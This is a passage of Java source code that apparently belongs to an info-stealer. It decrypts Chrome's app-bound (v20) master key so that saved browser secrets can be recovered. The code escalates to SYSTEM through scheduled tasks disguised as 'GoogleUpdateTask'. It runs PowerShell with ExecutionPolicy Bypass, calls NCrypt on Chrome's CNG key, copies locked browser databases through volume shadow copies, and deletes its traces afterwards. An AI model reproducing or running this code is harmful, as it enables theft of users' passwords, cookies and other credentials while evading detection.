            Path tempLs = robustCopy(localStateFile.getAbsolutePath());
            if (tempLs == null) return null;
            String json = new String(Files.readAllBytes(tempLs), StandardCharsets.UTF_8);
            Files.deleteIfExists(tempLs);

            JsonObject localState = JsonParser.parseString(json).getAsJsonObject();
            JsonObject osCrypt = localState.has("os_crypt") ? localState.getAsJsonObject("os_crypt") : null;
            if (osCrypt == null || !osCrypt.has("app_bound_encrypted_key"))
                return null;

            // Step 1: Base64 decode and strip "APPB" prefix
            String appBoundB64 = osCrypt.get("app_bound_encrypted_key").getAsString();
            byte[] decoded = Base64.getDecoder().decode(appBoundB64);
            if (decoded.length < 4)
                return null;
            String prefix = new String(decoded, 0, 4, StandardCharsets.US_ASCII);
            if (!"APPB".equals(prefix))
                return null;
            byte[] systemEncryptedBlob = Arrays.copyOfRange(decoded, 4, decoded.length);

            // Step 2: SYSTEM DPAPI decrypt (needs SYSTEM privilege → schtasks trick)
            byte[] userEncryptedBlob = decryptSystemDPAPI(systemEncryptedBlob);
            if (userEncryptedBlob == null) {
                System.err.println("[v20] SYSTEM DPAPI failed, trying direct user DPAPI (may fail)");
                try {
                    userEncryptedBlob = Crypt32Util.cryptUnprotectData(systemEncryptedBlob);
                } catch (Exception ignored) {
                }
            }
            if (userEncryptedBlob == null)
                return null;

            // Step 3: User DPAPI decrypt
            byte[] keyBlobData = null;
            try {
                keyBlobData = Crypt32Util.cryptUnprotectData(userEncryptedBlob);
            } catch (Exception e) {
                keyBlobData = decryptDPAPIPowerShell(userEncryptedBlob);
            }
            if (keyBlobData == null)
                return null;

            // Step 4: Parse the key blob
            KeyBlob blob = parseKeyBlob(keyBlobData);
            if (blob == null)
                return null;

            // Step 5: Derive master key based on flag
            return deriveV20MasterKey(blob);

        } catch (Exception e) {
            System.err.println("[v20] extractV20MasterKey error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Decrypts data using SYSTEM DPAPI by running a scheduled task as SYSTEM.
     * This is equivalent to Python's 'with impersonate_lsass():
     * dpapi.unprotect(data)'
     */
    private static byte[] decryptSystemDPAPI(byte[] data) {
        try {
            String b64Input = Base64.getEncoder().encodeToString(data);
            String tmpDir = System.getProperty("java.io.tmpdir");
            String scriptPath = tmpDir + "\\gu_task.ps1";
            String outputPath = tmpDir + "\\gu_out.b64";
            String taskName = "GoogleUpdateTask" + System.currentTimeMillis();

            // Write PowerShell script that runs as SYSTEM and does CurrentUser DPAPI
            // (When SYSTEM runs it, CurrentUser = SYSTEM, which is what Chrome's outer
            // DPAPI used)
            String psScript = "Add-Type -AssemblyName System.Security\n" +
                    "try {\n" +
                    "    $b = [Convert]::FromBase64String('" + b64Input + "')\n" +
                    "    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)\n"
                    +
                    "    [IO.File]::WriteAllText('" + outputPath.replace("\\", "\\\\")
                    + "', [Convert]::ToBase64String($dec))\n" +
                    "} catch {}\n";

            Files.write(Paths.get(scriptPath), psScript.getBytes(StandardCharsets.UTF_8));

            // Create scheduled task to run as SYSTEM
            Runtime.getRuntime().exec(new String[] { "cmd", "/c",
                    "schtasks /create /tn \"" + taskName
                            + "\" /tr \"powershell -NoProfile -ExecutionPolicy Bypass -File \"\"" +
                            scriptPath + "\"\"\" /sc ONCE /st 00:00 /ru SYSTEM /f"
            }).waitFor();

            // Run task
            Runtime.getRuntime().exec(new String[] { "cmd", "/c",
                    "schtasks /run /tn \"" + taskName + "\""
            }).waitFor();

            // Wait up to 10s for output file
            File outFile = new File(outputPath);
            for (int i = 0; i < 20; i++) {
                Thread.sleep(500);
                if (outFile.exists() && outFile.length() > 0)
                    break;
            }

            byte[] result = null;
            if (outFile.exists() && outFile.length() > 0) {
                String b64Result = new String(Files.readAllBytes(outFile.toPath()), StandardCharsets.UTF_8).trim();
                result = Base64.getDecoder().decode(b64Result);
            }

            // Clean up
            Runtime.getRuntime().exec(new String[] { "cmd", "/c",
                    "schtasks /delete /tn \"" + taskName + "\" /f"
            });
            Files.deleteIfExists(Paths.get(scriptPath));
            Files.deleteIfExists(outFile.toPath());

            return result;
        } catch (Exception e) {
            System.err.println("[v20] decryptSystemDPAPI error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Parses the Chrome v20 key blob.
     * Format:
     * [header_len: 4 LE] [header: header_len bytes]
     * [content_len: 4 LE] [flag: 1 byte]
     * Flag 1 or 2: [iv:12][ct:32][tag:16]
     * Flag 3: [enc_aes_key:32][iv:12][ct:32][tag:16]
     */
    private static KeyBlob parseKeyBlob(byte[] data) {
        try {
            java.nio.ByteBuffer buf = java.nio.ByteBuffer.wrap(data).order(java.nio.ByteOrder.LITTLE_ENDIAN);

            int headerLen = buf.getInt();
            byte[] header = new byte[headerLen];
            buf.get(header);

            int contentLen = buf.getInt();
            // Sanity check
            if (headerLen + contentLen + 8 != data.length) {
                System.err.println("[v20] Key blob size mismatch: header=" + headerLen + " content=" + contentLen
                        + " total=" + data.length);
                // Don't bail — Chrome may vary slightly; continue parsing
            }

            int flag = buf.get() & 0xFF;
            KeyBlob blob = new KeyBlob();
            blob.flag = flag;

            if (flag == 1 || flag == 2) {
                // [iv:12][ct:32][tag:16]
                blob.iv = new byte[12];
                buf.get(blob.iv);
                blob.ciphertext = new byte[32];
                buf.get(blob.ciphertext);
                blob.tag = new byte[16];
                buf.get(blob.tag);
            } else if (flag == 3) {
                // [enc_aes_key:32][iv:12][ct:32][tag:16]
                blob.encryptedAesKey = new byte[32];
                buf.get(blob.encryptedAesKey);
                blob.iv = new byte[12];
                buf.get(blob.iv);
                blob.ciphertext = new byte[32];
                buf.get(blob.ciphertext);
                blob.tag = new byte[16];
                buf.get(blob.tag);
            } else {
                System.err.println("[v20] Unsupported key blob flag: " + flag);
                return null;
            }

            return blob;
        } catch (Exception e) {
            System.err.println("[v20] parseKeyBlob error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Derives the v20 master key from a parsed key blob.
     * Flag 1 → AES-GCM decrypt with hardcoded key
     * Flag 2 → ChaCha20-Poly1305 decrypt with hardcoded key
     * Flag 3 → NCrypt decrypt + XOR + AES-GCM decrypt
     */
    private static byte[] deriveV20MasterKey(KeyBlob blob) {
        try {
            byte[] ctAndTag = concat(blob.ciphertext, blob.tag);

            if (blob.flag == 1) {
                // AES-256-GCM with hardcoded derived key
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(Cipher.DECRYPT_MODE,
                        new SecretKeySpec(V20_FLAG1_KEY, "AES"),
                        new GCMParameterSpec(128, blob.iv));
                return cipher.doFinal(ctAndTag);

            } else if (blob.flag == 2) {
                // ChaCha20-Poly1305 with hardcoded derived key
                Cipher cipher = Cipher.getInstance("ChaCha20-Poly1305");
                cipher.init(Cipher.DECRYPT_MODE,
                        new SecretKeySpec(V20_FLAG2_KEY, "ChaCha20"),
                        new javax.crypto.spec.IvParameterSpec(blob.iv));
                return cipher.doFinal(ctAndTag);

            } else if (blob.flag == 3) {
                // Step 1: NCrypt decrypt the encrypted AES key (must run as SYSTEM)
                byte[] ncryptDecrypted = decryptWithNCryptPS(blob.encryptedAesKey);
                if (ncryptDecrypted == null) {
                    System.err.println("[v20] NCrypt decryption failed for flag 3");
                    return null;
                }
                // Step 2: XOR with the flag3 xor key
                byte[] xoredKey = byteXor(ncryptDecrypted, V20_FLAG3_XOR);
                // Step 3: AES-GCM decrypt the master key ciphertext
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(Cipher.DECRYPT_MODE,
                        new SecretKeySpec(xoredKey, "AES"),
                        new GCMParameterSpec(128, blob.iv));
                return cipher.doFinal(ctAndTag);

            }
        } catch (Exception e) {
            System.err.println("[v20] deriveV20MasterKey error (flag=" + blob.flag + "): " + e.getMessage());
        }
        return null;
    }

    /**
     * Calls NCrypt to decrypt data using Chrome's 'Google Chromekey1' CNG key.
     * Runs as SYSTEM via scheduled task (mirrors Python's impersonate_lsass() +
     * decrypt_with_cng()).
     */
    private static byte[] decryptWithNCryptPS(byte[] encryptedKey) {
        try {
            String b64Input = Base64.getEncoder().encodeToString(encryptedKey);
            String tmpDir = System.getProperty("java.io.tmpdir");
            String scriptPath = tmpDir + "\\ncrypt_task.ps1";
            String outputPath = tmpDir + "\\ncrypt_out.b64";
            String taskName = "ChromeNCryptTask" + System.currentTimeMillis();

            String psScript = "Add-Type -MemberDefinition @\"\n" +
                    "[DllImport(\"ncrypt.dll\", CharSet=CharSet.Unicode)]\n" +
                    "public static extern int NCryptOpenStorageProvider(out System.IntPtr hProvider, string pszProviderName, int dwFlags);\n"
                    +
                    "[DllImport(\"ncrypt.dll\", CharSet=CharSet.Unicode)]\n" +
                    "public static extern int NCryptOpenKey(System.IntPtr hProvider, out System.IntPtr hKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);\n"
                    +
                    "[DllImport(\"ncrypt.dll\")]\n" +
                    "public static extern int NCryptDecrypt(System.IntPtr hKey, byte[] pbInput, int cbInput, System.IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);\n"
                    +
                    "[DllImport(\"ncrypt.dll\")]\n" +
                    "public static extern int NCryptFreeObject(System.IntPtr hObject);\n" +
                    "\"@ -Name NCrypt -Namespace Win32\n" +
                    "$hProv = [System.IntPtr]::Zero; $hKey = [System.IntPtr]::Zero\n" +
                    "$r = [Win32.NCrypt]::NCryptOpenStorageProvider([ref]$hProv, 'Microsoft Software Key Storage Provider', 0)\n"
                    +
                    "if ($r -ne 0) { exit }\n" +
                    "$r = [Win32.NCrypt]::NCryptOpenKey($hProv, [ref]$hKey, 'Google Chromekey1', 0, 0)\n" +
                    "if ($r -ne 0) { exit }\n" +
                    "$inp = [Convert]::FromBase64String('" + b64Input + "')\n" +
                    "$cbResult = 0\n" +
                    "[Win32.NCrypt]::NCryptDecrypt($hKey, $inp, $inp.Length, [System.IntPtr]::Zero, $null, 0, [ref]$cbResult, 0x40) | Out-Null\n"
                    +
                    "$out = New-Object byte[] $cbResult\n" +
                    "[Win32.NCrypt]::NCryptDecrypt($hKey, $inp, $inp.Length, [System.IntPtr]::Zero, $out, $cbResult, [ref]$cbResult, 0x40) | Out-Null\n"
                    +
                    "[Win32.NCrypt]::NCryptFreeObject($hKey) | Out-Null\n" +
                    "[Win32.NCrypt]::NCryptFreeObject($hProv) | Out-Null\n" +
                    "[IO.File]::WriteAllText('" + outputPath.replace("\\", "\\\\")
                    + "', [Convert]::ToBase64String($out[0..($cbResult-1)]))\n";

            Files.write(Paths.get(scriptPath), psScript.getBytes(StandardCharsets.UTF_8));

            Runtime.getRuntime().exec(new String[] { "cmd", "/c",
                    "schtasks /create /tn \"" + taskName
                            + "\" /tr \"powershell -NoProfile -ExecutionPolicy Bypass -File \"\"" +
                            scriptPath + "\"\"\" /sc ONCE /st 00:00 /ru SYSTEM /f"
            }).waitFor();
            Runtime.getRuntime().exec(new String[] { "cmd", "/c",
                    "schtasks /run /tn \"" + taskName + "\""
            }).waitFor();

            File outFile = new File(outputPath);
            for (int i = 0; i < 20; i++) {
                Thread.sleep(500);
                if (outFile.exists() && outFile.length() > 0)
                    break;
            }

            byte[] result = null;
            if (outFile.exists() && outFile.length() > 0) {
                String b64Result = new String(Files.readAllBytes(outFile.toPath()), StandardCharsets.UTF_8).trim();
                result = Base64.getDecoder().decode(b64Result);
            }

            Runtime.getRuntime().exec(new String[] { "cmd", "/c",
                    "schtasks /delete /tn \"" + taskName + "\" /f" });
            Files.deleteIfExists(Paths.get(scriptPath));
            Files.deleteIfExists(outFile.toPath());
            return result;

        } catch (Exception e) {
            System.err.println("[v20] decryptWithNCryptPS error: " + e.getMessage());
            return null;
        }
    }

    /** Concatenates two byte arrays. */
    private static byte[] concat(byte[] a, byte[] b) {
        byte[] result = new byte[a.length + b.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }

    private static byte[] byteXor(byte[] a, byte[] b) {
        int len = Math.min(a.length, b.length);
        byte[] result = new byte[len];
        for (int i = 0; i < len; i++)
            result[i] = (byte) (a[i] ^ b[i]);
        return result;
    }

    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2)
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        return data;
    }

    private static class KeyBlob {
        int flag;
        byte[] encryptedAesKey;
        byte[] iv;
        byte[] ciphertext;
        byte[] tag;
    }

    private static Path robustCopy(String sourcePath) {
        if (sourcePath == null || !new File(sourcePath).exists())
            return null;
        try {
            Path target = Files.createTempFile("hshit_", ".db");
            File sourceFile = new File(sourcePath);
            String b64Source = Base64.getEncoder().encodeToString(sourceFile.getAbsolutePath().getBytes(StandardCharsets.UTF_16LE));
            String b64Target = Base64.getEncoder().encodeToString(target.toAbsolutePath().toString().getBytes(StandardCharsets.UTF_16LE));
            
            String psScript = String.format(
                "$s_path=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('%s'));" +
                "$t_path=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('%s'));" +
                "try {" +
                "    $fs = [System.IO.File]::Open($s_path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);" +
                "    $out = [System.IO.File]::OpenWrite($t_path); $fs.CopyTo($out); $fs.Close(); $out.Close();" +
                "    if((Get-Item $t_path).Length -gt 0){ Write-Output 'OK'; exit }" +
                "} catch {}" +
                "try {" +
                "    $drive = (Split-Path $s_path -Qualifier);" +
                "    $vss = (Get-WmiObject -List Win32_ShadowCopy).Create($drive, 'ClientAccessible');" +
                "    $ctx = [WMI]('\\\\localhost\\root\\cimv2:Win32_ShadowCopy.ID=\"' + $vss.ShadowID + '\"');" +
                "    $shadowPath = $s_path -replace [regex]::Escape($drive), $ctx.DeviceObject;" +
                "    Copy-Item -LiteralPath $shadowPath -Destination $t_path -Force;" +
                "    if(Test-Path $t_path){ Write-Output 'OK'; exit }" +
                "} catch {}" +
                "robocopy (Split-Path $s_path) (Split-Path $t_path) (Split-Path $s_path -Leaf) /B /R:0 /W:0 /NJH /NJS | Out-Null;" +
                "if(Test-Path $t_path){ Write-Output 'OK' }",
                b64Source, b64Target
            );
            
            String result = utilities.runPowerShellSync(psScript);
            if (result != null && result.contains("OK") && target.toFile().length() > 0) {
                copyWalShm(sourcePath, target.toAbsolutePath().toString());
                return target;
            }
            utilities.runCommandSync("cmd /c copy /y \"" + sourceFile.getAbsolutePath() + "\" \"" + target.toAbsolutePath() + "\"");
            if (target.toFile().length() > 0) {
                copyWalShm(sourcePath, target.toAbsolutePath().toString());
                return target;
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static void copyWalShm(String sourcePath, String targetPath) {
        String[] suffixes = { "-wal", "-shm" };
        for (String s : suffixes) {
            File extra = new File(sourcePath + s);
            if (extra.exists()) {
                try {
                    Files.copy(extra.toPath(), new File(targetPath + s).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                } catch (Exception e) {
                    try {
                        String b64E = Base64.getEncoder().encodeToString(extra.getAbsolutePath().getBytes(StandardCharsets.UTF_16LE));
                        String b64T = Base64.getEncoder().encodeToString((targetPath + s).getBytes(StandardCharsets.UTF_16LE));
                        String ps = String.format(
                            "$s=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('%s'));" +
                            "$t=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('%s'));" +
                            "Copy-Item -LiteralPath $s -Destination $t -Force", b64E, b64T);
                        utilities.runPowerShellSync(ps);
                    } catch (Exception ignored) {}
                }
            }
        }
    }

    private static byte[] extractMasterKey(String browserPath) {
        try {
            File localStateFile = new File(browserPath, "Local State");
            if (!localStateFile.exists()) return null;
            Path tempLocalState = robustCopy(localStateFile.getAbsolutePath());
            if (tempLocalState == null) return null;
            String json = FileUtils.readFileToString(tempLocalState.toFile(), StandardCharsets.UTF_8);
            Files.deleteIfExists(tempLocalState);
            JsonObject localState = JsonParser.parseString(json).getAsJsonObject();
            String encryptedKey = localState.getAsJsonObject("os_crypt").get("encrypted_key").getAsString();
            byte[] decodedKey = Base64.getDecoder().decode(encryptedKey);
            byte[] encryptedKeyData = Arrays.copyOfRange(decodedKey, 5, decodedKey.length);
            try { return Crypt32Util.cryptUnprotectData(encryptedKeyData); } 
            catch (Exception e) { return decryptDPAPIPowerShell(encryptedKeyData); }
        } catch (Exception ignored) { return null; }
    }

    private static String decryptDirectDPAPI(byte[] data) {
        try {
            String b64 = Base64.getEncoder().encodeToString(data);
            String ps = "Add-Type -AssemblyName System.Security; $b=[Convert]::FromBase64String('" + b64
                    + "'); $p=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser); [Console]::Out.Write([Convert]::ToBase64String($p))";
            String result = utilities.runPowerShellSync(ps);
            if (result != null && !result.isEmpty()) return new String(Base64.getDecoder().decode(result.trim()), StandardCharsets.UTF_8);
        } catch (Exception ignored) {}
        return null;
    }

    private static byte[] decryptDPAPIPowerShell(byte[] data) {
        try {
            String b64 = Base64.getEncoder().encodeToString(data);
            String ps = "Add-Type -AssemblyName System.Security; $b=[Convert]::FromBase64String('" + b64
                    + "'); $p=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser); [Console]::Out.Write([Convert]::ToBase64String($p))";
            String result = utilities.runPowerShellSync(ps);
            if (result != null && !result.isEmpty()) return Base64.getDecoder().decode(result.trim());
        } catch (Exception ignored) {}
        return null;
    }
    private static class BrowserConfig {
        String name;
        String path;
        BrowserConfig(String name, String path) { this.name = name; this.path = path; }
    }
}